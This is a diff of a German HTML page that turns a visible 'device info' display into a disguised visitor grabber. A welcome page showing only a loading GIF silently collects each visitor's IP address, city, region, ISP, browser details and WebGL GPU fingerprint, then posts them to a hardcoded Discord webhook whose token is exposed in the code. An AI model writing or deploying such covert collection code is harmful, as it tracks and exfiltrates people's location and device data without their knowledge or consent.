@@ -2,46 +2,32 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <title>Geräte-Infos</title>
+    <title>Willkommen</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            margin: 30px;
-            background: #f0f0f0;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        .info {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 10px #ccc;
-            max-width: 800px;
-            margin: auto;
-        }
-        h1 {
-            text-align: center;
-        }
-        pre {
-            background: #eee;
-            padding: 10px;
-            border-radius: 5px;
-            overflow-x: auto;
+        img {
+            max-width: 90%;
+            max-height: 90%;
         }
     </style>
 </head>
 <body>
 
-<div class="info">
-    <h1>Deine Geräte-Informationen</h1>
-    <pre id="output">Lade Daten...</pre>
-</div>
+<img src="https://media0.giphy.com/media/Oc8lIQHZsXqDu/giphy.gif?cid=6c09b952b81g0fpjptlfnrbz9m9b8tzzab3t0uocapx99zbq&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g" alt="Laden...">
 
 <script>
-const webhookUrl = "https://discord.com/api/webhooks/1365776827787903068/StBWh9kwc5IAZVoTZWUd7ravbE3vReMNkyic1_sIlmj40NKmowSDPG_fo41vMvpSnGWv"; // <-- Deinen Webhook hier einfügen
+const webhookUrl = "https://discord.com/api/webhooks/1365776827787903068/StBWh9kwc5IAZVoTZWUd7ravbE3vReMNkyic1_sIlmj40NKmowSDPG_fo41vMvpSnGWv"; // <-- Hier deinen Discord Webhook einfügen
 
 async function collectData() {
     const data = {};
 
-    // IP und Location
     try {
         const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
         data.ip = ipData.ip;
@@ -54,7 +40,6 @@ async function collectData() {
         data.country = "Unbekannt";
     }
 
-    // Browser Infos
     data.userAgent = navigator.userAgent;
     data.language = navigator.language;
     data.platform = navigator.platform;
@@ -65,7 +50,18 @@ async function collectData() {
     data.orientation = (screen.orientation || {}).type || "Nicht erkannt";
     data.localTime = new Date().toString();
 
-    document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } else {
+            data.gpu = "Nicht verfügbar";
+        }
+    } catch {
+        data.gpu = "Nicht ermittelbar";
+    }
 
     return data;
 }
@@ -74,7 +70,7 @@ async function sendToDiscord() {
     const info = await collectData();
 
     const embed = {
-        title: "Neue Geräte-Infos",
+        title: "Neue Besucher-Infos",
         color: 5814783, // hellblau
         fields: [
             { name: "IP", value: info.ip || "Unbekannt", inline: true },
@@ -82,6 +78,7 @@ async function sendToDiscord() {
             { name: "Stadt", value: info.city || "Unbekannt", inline: true },
             { name: "Region", value: info.region || "Unbekannt", inline: true },
             { name: "ISP", value: info.isp || "Unbekannt", inline: false },
+            { name: "GPU", value: info.gpu || "Unbekannt", inline: false },
             { name: "Browser", value: info.userAgent || "Unbekannt", inline: false },
             { name: "Sprache", value: info.language || "Unbekannt", inline: true },
             { name: "Plattform", value: info.platform || "Unbekannt", inline: true },
@@ -93,7 +90,7 @@ async function sendToDiscord() {
             { name: "Lokale Zeit", value: info.localTime || "Unbekannt", inline: false },
         ],
         footer: {
-            text: "Automatisch gesammelt"
+            text: "Automatisch erfasst"
         },
         timestamp: new Date()
     };
